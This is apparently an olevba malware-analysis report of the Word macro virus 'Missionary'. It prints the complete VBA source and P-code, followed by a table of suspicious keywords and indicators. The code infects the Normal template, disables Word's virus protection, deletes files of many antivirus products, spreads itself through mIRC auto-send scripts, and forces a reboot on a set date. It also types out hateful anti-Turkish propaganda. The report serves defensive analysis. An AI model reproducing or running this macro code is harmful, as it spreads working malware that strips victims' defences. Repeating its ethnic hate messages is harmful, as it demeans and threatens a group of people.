olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Missionary
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Missionary - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO missionary.bas 
in file: ./Virus.MSWord.Missionary - OLE stream: 'Macros/VBA/missionary'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Application.VBE.ActiveVBProject.VBComponents("missionary").Export "C:\WINDOWS\missionary.sys"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "missionary" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "missionary" Then ActivInstall = True
Next I
If ActivInstall = True And NormInstall = False Then Set Dobj = NormalTemplate.VBProject
If NormInstall = True And ActivInstall = False Then Set Dobj = ActiveDocument.VBProject
Dobj.VBComponents.Import ("c:\WINDOWS\missionary.sys")
ActiveDocument.SaveAs Filename:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
NormalTemplate.Save
CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
CommandBars("Format").Controls("Style...").Delete
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.DisplayAlerts = wdAlertsNone
Application.StatusBar = False
Kill "C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"
Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
Kill "C:\Program Files\Command Software\F-PROT95\*.dll"
Kill "C:\Program Files\Command Software\F-PROT95\*.exe"
Kill "C:\Program Files\McAfee\VirusScan95\Scan.dat"
Kill "C:\Program Files\McAfee\VirusScan\Scan.dat"
Kill "C:\Program Files\Norton AntiVirus\Viruscan.dat"
Kill "C:\Program Files\Symantec\Symevnt.386"
Kill "C:\Program Files\FindVirus\Findviru.drv"
Kill "C:\Program Files\Cheyenne\AntiVirus\*.dll"
Kill "C:\Program Files\Cheyenne\Common\Cshell.dll"
Kill "C:\PC-Cillin 95\Lpt$vpn.*"
Kill "C:\PC-Cillin 95\Scan32.dll"
Kill "C:\eSafe\Protect\*.dll"
Kill "c:\f-macro\f-macro.exe"
Kill "C:\TBAVW95\Tbscan.sig"
Kill "C:\Tbavw95\Tb*.*"
Kill "C:\VS95\*.dll"
End Sub

Sub AutoNew()
On Error Resume Next
K = Dir("c:\mirc\mirc32.exe")
If K = "" Then
Exit Sub
Else
m = Dir("c:\mirc\backup\needforspeedIII.doc")
If m = "" Then ActiveDocument.SaveAs "c:\mirc\backup\needforspeedIII.doc"
Kill "c:\mirc\script.ini"
Open "c:\mirc\script.ini" For Random As #1
Print #1, "[script]"
Print #1, "n0=on 1:text:*virus*:#:/msg $chan Virii Rule"
Print #1, "n1=on 1:text:*virus*:#:/join #vir | /amsg I am infected with Missionary virus by PhreakX"
Print #1, "n2=on 1:text:*missionary*:#:/amsg I am infected with Missionary virus by PhreakX"
Print #1, "n3=on 1:text:*turkey*:#:/msg $chan Turkey sucks"
Print #1, "n4=on 1:join:#:/send $nick c:\mirc\backup\needforspeedIII.doc"
Close #1
End If
End Sub

Sub FileSave()
On Error Resume Next
Randomize
If Day(Now) = 20 Then
MsgBox "Missionary Virus", vbCritical, "3C"
Selection.MoveStart
Selection.TypeText "I am a Missionary, my mission is to inform."
Selection.TypeText " The information that I will give you today concerns injustice."
Selection.TypeText " On the 20th of July 1974 the Turkish troops under the commands of"
Selection.TypeText " Bulet Eccevit invated Cyprus, took over our houses, killed our relatives"
Selection.TypeText " raped our mothers and sisters and they still live there."
Selection.TypeText " They call southern Cyprus 'Turkey', what they don't understand is that"
Selection.TypeText " no matter what they call it, it is still Cyprus."
Selection.TypeText " All you Turks out there who believe Cyprus belongs to you"
Selection.TypeText " watch out, because someone is after you, and this someone is"
Selection.TypeText " PhreakX"
Selection.TypeText "---3C Group wants freedom for Cyprus and not war, but as long as"
Selection.TypeText " people like Bulet Eccevit, Raouf Degtas and Tatsun Chiller are alive"
Selection.TypeText " freedom remains a dream..."
Selection.TypeText "+-=PhreakX=-+"
Selection.TypeText "   Visit 3C at http://come.to/CCCriminals"
Selection.TypeText "   -A Good Turk Is A Dead Turk-"
Beep
MsgBox "You are infected with Missionary Virus by PhreakX. Click on OK if you hate Turks", vbApplicationModal, "Missionary Virus"
End If
ActiveDocument.Save
End Sub

Sub AutoClose()
If Month(Now()) = 8 And Day(Now()) = 14 Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "reboot") = "c:\windows\rundll.exe user.exe,exitwindowsexec"
Shell "C:\WINDOWS\RUNDLL.EXE user.exe,exitwindowsexec"
End If
End Sub

Sub EditPaste()
MsgBox "No paste for you boy."
MsgBox "Missionary virus doesn't allow you"
End Sub

Sub EditCopy()
MsgBox "Error on procedure Copy"
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Missionary
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/missionary - 8949 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #3:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #5:
' 	LitStr 0x0019 "C:\WINDOWS\missionary.sys"
' 	LitStr 0x000A "missionary"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #6:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #7:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "missionary"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #8:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #9:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #10:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "missionary"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActivInstall 
' 	EndIf 
' Line #11:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set Dobj 
' 	EndIf 
' Line #13:
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set Dobj 
' 	EndIf 
' Line #14:
' 	LitStr 0x0019 "c:\WINDOWS\missionary.sys"
' 	Paren 
' 	Ld Dobj 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #15:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Filename 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #16:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #17:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #18:
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #19:
' 	LitStr 0x0008 "Style..."
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #22:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt StatusBar 
' Line #24:
' 	LitStr 0x0030 "C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"
' 	ArgsCall Kill 0x0001 
' Line #25:
' 	LitStr 0x002C "C:\Program Files\AntiViral Toolkit Pro\*.avc"
' 	ArgsCall Kill 0x0001 
' Line #26:
' 	LitStr 0x0030 "C:\Program Files\Command Software\F-PROT95\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #27:
' 	LitStr 0x0030 "C:\Program Files\Command Software\F-PROT95\*.exe"
' 	ArgsCall Kill 0x0001 
' Line #28:
' 	LitStr 0x002C "C:\Program Files\McAfee\VirusScan95\Scan.dat"
' 	ArgsCall Kill 0x0001 
' Line #29:
' 	LitStr 0x002A "C:\Program Files\McAfee\VirusScan\Scan.dat"
' 	ArgsCall Kill 0x0001 
' Line #30:
' 	LitStr 0x002E "C:\Program Files\Norton AntiVirus\Viruscan.dat"
' 	ArgsCall Kill 0x0001 
' Line #31:
' 	LitStr 0x0025 "C:\Program Files\Symantec\Symevnt.386"
' 	ArgsCall Kill 0x0001 
' Line #32:
' 	LitStr 0x0027 "C:\Program Files\FindVirus\Findviru.drv"
' 	ArgsCall Kill 0x0001 
' Line #33:
' 	LitStr 0x0029 "C:\Program Files\Cheyenne\AntiVirus\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #34:
' 	LitStr 0x002B "C:\Program Files\Cheyenne\Common\Cshell.dll"
' 	ArgsCall Kill 0x0001 
' Line #35:
' 	LitStr 0x0019 "C:\PC-Cillin 95\Lpt$vpn.*"
' 	ArgsCall Kill 0x0001 
' Line #36:
' 	LitStr 0x001A "C:\PC-Cillin 95\Scan32.dll"
' 	ArgsCall Kill 0x0001 
' Line #37:
' 	LitStr 0x0016 "C:\eSafe\Protect\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #38:
' 	LitStr 0x0016 "c:\f-macro\f-macro.exe"
' 	ArgsCall Kill 0x0001 
' Line #39:
' 	LitStr 0x0015 "C:\TBAVW95\Tbscan.sig"
' 	ArgsCall Kill 0x0001 
' Line #40:
' 	LitStr 0x0010 "C:\Tbavw95\Tb*.*"
' 	ArgsCall Kill 0x0001 
' Line #41:
' 	LitStr 0x000D "C:\VS95\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Sub AutoNew())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	LitStr 0x0012 "c:\mirc\mirc32.exe"
' 	ArgsLd Dir 0x0001 
' 	St K 
' Line #47:
' 	Ld K 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #48:
' 	ExitSub 
' Line #49:
' 	ElseBlock 
' Line #50:
' 	LitStr 0x0022 "c:\mirc\backup\needforspeedIII.doc"
' 	ArgsLd Dir 0x0001 
' 	St m 
' Line #51:
' 	Ld m 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0022 "c:\mirc\backup\needforspeedIII.doc"
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #52:
' 	LitStr 0x0012 "c:\mirc\script.ini"
' 	ArgsCall Kill 0x0001 
' Line #53:
' 	LitStr 0x0012 "c:\mirc\script.ini"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Random)
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "[script]"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "n0=on 1:text:*virus*:#:/msg $chan Virii Rule"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0058 "n1=on 1:text:*virus*:#:/join #vir | /amsg I am infected with Missionary virus by PhreakX"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0050 "n2=on 1:text:*missionary*:#:/amsg I am infected with Missionary virus by PhreakX"
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "n3=on 1:text:*turkey*:#:/msg $chan Turkey sucks"
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "n4=on 1:join:#:/send $nick c:\mirc\backup\needforspeedIII.doc"
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	EndSub 
' Line #63:
' Line #64:
' 	FuncDefn (Sub FileSave())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	ArgsCall Read 0x0000 
' Line #67:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Eq 
' 	IfBlock 
' Line #68:
' 	LitStr 0x0010 "Missionary Virus"
' 	Ld vbCritical 
' 	LitStr 0x0002 "3C"
' 	ArgsCall MsgBox 0x0003 
' Line #69:
' 	Ld Selection 
' 	ArgsMemCall MoveStart 0x0000 
' Line #70:
' 	LitStr 0x002B "I am a Missionary, my mission is to inform."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #71:
' 	LitStr 0x003F " The information that I will give you today concerns injustice."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #72:
' 	LitStr 0x0042 " On the 20th of July 1974 the Turkish troops under the commands of"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #73:
' 	LitStr 0x0049 " Bulet Eccevit invated Cyprus, took over our houses, killed our relatives"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #74:
' 	LitStr 0x0039 " raped our mothers and sisters and they still live there."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #75:
' 	LitStr 0x0047 " They call southern Cyprus 'Turkey', what they don't understand is that"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #76:
' 	LitStr 0x0031 " no matter what they call it, it is still Cyprus."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #77:
' 	LitStr 0x003A " All you Turks out there who believe Cyprus belongs to you"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #78:
' 	LitStr 0x003D " watch out, because someone is after you, and this someone is"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #79:
' 	LitStr 0x0008 " PhreakX"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #80:
' 	LitStr 0x0040 "---3C Group wants freedom for Cyprus and not war, but as long as"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #81:
' 	LitStr 0x0045 " people like Bulet Eccevit, Raouf Degtas and Tatsun Chiller are alive"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #82:
' 	LitStr 0x001B " freedom remains a dream..."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #83:
' 	LitStr 0x000D "+-=PhreakX=-+"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #84:
' 	LitStr 0x0029 "   Visit 3C at http://come.to/CCCriminals"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #85:
' 	LitStr 0x001F "   -A Good Turk Is A Dead Turk-"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #86:
' 	ArgsCall Beep 0x0000 
' Line #87:
' 	LitStr 0x0050 "You are infected with Missionary Virus by PhreakX. Click on OK if you hate Turks"
' 	Ld vbApplicationModal 
' 	LitStr 0x0010 "Missionary Virus"
' 	ArgsCall MsgBox 0x0003 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #90:
' 	EndSub 
' Line #91:
' Line #92:
' 	FuncDefn (Sub AutoClose())
' Line #93:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #94:
' 	LitStr 0x002E "c:\windows\rundll.exe user.exe,exitwindowsexec"
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0006 "reboot"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #95:
' 	LitStr 0x002E "C:\WINDOWS\RUNDLL.EXE user.exe,exitwindowsexec"
' 	ArgsCall Shell 0x0001 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	EndSub 
' Line #98:
' Line #99:
' 	FuncDefn (Sub EditPaste())
' Line #100:
' 	LitStr 0x0015 "No paste for you boy."
' 	ArgsCall MsgBox 0x0001 
' Line #101:
' 	LitStr 0x0022 "Missionary virus doesn't allow you"
' 	ArgsCall MsgBox 0x0001 
' Line #102:
' 	EndSub 
' Line #103:
' Line #104:
' 	FuncDefn (Sub EditCopy())
' Line #105:
' 	LitStr 0x0017 "Error on procedure Copy"
' 	ArgsCall MsgBox 0x0001 
' Line #106:
' 	EndSub 
' Line #107:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://come.to/CCCri|URL                                          |
|          |minals              |                                             |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Avp32.exe           |Executable file name                         |
|IOC       |Cshell.dll          |Executable file name                         |
|IOC       |Scan32.dll          |Executable file name                         |
|IOC       |macro.exe           |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |rundll.exe          |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

